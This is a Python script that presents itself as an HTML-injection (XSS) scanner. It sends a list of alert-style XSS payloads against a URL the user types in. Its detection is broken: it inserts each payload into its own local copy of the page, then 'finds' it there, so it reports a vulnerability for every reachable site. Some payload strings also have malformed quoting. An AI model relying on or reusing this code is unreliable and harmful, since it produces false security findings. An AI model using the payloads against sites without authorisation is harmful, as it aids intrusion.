import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style

# List of common HTML injection payloads
payloads = [
    "<script>alert('XSS Vulnerability');</script>",
    "<img src=\"javascript:alert('XSS Vulnerability');\">",
    "<iframe src=\"javascript:alert('XSS Vulnerability');\"></iframe>",
    "<svg/onload=alert('XSS Vulnerability')>",
    "'\"<script>alert('XSS Vulnerability');</script>",
    "<BODY ONLOAD=alert('XSS Vulnerability')>",
    "<BODY BACKGROUND='javascript:alert('XSS Vulnerability')'>",
    "<IMG SRC='vbscript:msgbox('XSS Vulnerability')'>",
    "<LINK REL='stylesheet' HREF='javascript:alert('XSS Vulnerability')'>",
    "<IMG SRC=\"jav&#x0D;ascript:alert('XSS Vulnerability');\">",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS Vulnerability');\">",
    "<IMG SRC=\"jav&#x0A;ascript:alert('XSS Vulnerability');\">",
    "<IMG SRC=\"jav&#x0C;ascript:alert('XSS Vulnerability');\">",
    "<IMG SRC=\"jav&#x0B;ascript:alert('XSS Vulnerability');\">",
]

def test_html_injection(url, payloads):
    try:
        # Send a GET request to the specified URL
        response = requests.get(url)

        # Check if the response is successful (status code 200)
        if response.status_code == 200:
            # Parse the HTML content
            soup = BeautifulSoup(response.text, 'html.parser')

            # Check for each payload
            for payload in payloads:
                # Inject the payload into the response content
                injected_content = str(soup).replace("</body>", f"{payload}</body>")

                # Check if the payload appears in the injected content
                if payload in injected_content:
                    print(f"{Fore.RED}HTML Injection vulnerability detected with payload: {payload}{Style.RESET_ALL}")
                    print(f"{Fore.BLUE}Evidence:{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}Before Injection:{Style.RESET_ALL}")
                    print(response.text)
                    print(f"{Fore.GREEN}After Injection:{Style.RESET_ALL}")
                    print(injected_content)
                    print("To test this vulnerability, try the following steps:")
                    print("1. Enter the payload into a form or input field on the website.")
                    print("2. Submit the form or input the data.")
                    print("3. Check if the payload is executed or appears as part of the page content.")
                    return
            print("No HTML Injection vulnerability detected.")
        else:
            print(f"Failed to retrieve content from {url}. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

# Example usage:
if __name__ == "__main__":
    # Prompt the user to input the target website URL
    target_url = input("Enter your target website URL: ")

    # Test the HTML injection vulnerability with each payload
    test_html_injection(target_url, payloads)
